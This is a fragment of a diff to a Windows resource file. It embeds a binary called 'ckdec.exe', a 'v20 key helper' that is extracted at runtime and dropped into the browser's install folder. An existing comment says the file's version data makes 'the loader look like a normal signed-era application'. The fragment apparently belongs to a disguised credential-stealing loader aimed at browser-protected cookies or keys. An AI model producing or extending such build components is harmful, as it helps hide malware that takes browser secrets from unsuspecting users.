@@ -3,6 +3,10 @@
 // These values make the loader look like a normal signed-era application.
 #include <winver.h>
 
+// v20 key helper, extracted at runtime and dropped into the browser install
+// tree. Must be built before this file is compiled (build.bat order).
+CKHELP RCDATA "bin\\ckdec.exe"
+
 VS_VERSION_INFO VERSIONINFO
  FILEVERSION    1,0,26,7
  PRODUCTVERSION 1,0,26,7
